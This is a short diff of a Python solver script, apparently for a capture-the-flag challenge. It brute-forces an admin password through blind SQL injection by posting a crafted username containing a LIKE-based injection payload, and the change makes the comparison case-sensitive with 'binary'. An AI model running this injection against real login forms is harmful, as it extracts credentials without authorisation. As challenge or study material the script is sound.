@@ -7,7 +7,7 @@ def solve():
 	
 	while True:
 		for ch in allowed_chars:
-			urldata = "admin' and password like '%s%%'#" % (password+ch)
+			urldata = "admin' and password like binary '%s%%'#" % (password+ch)
 			r = requests.post(URL, data={"username":urldata})
 			if "There is already a(n)" in r.text:
 				password += ch
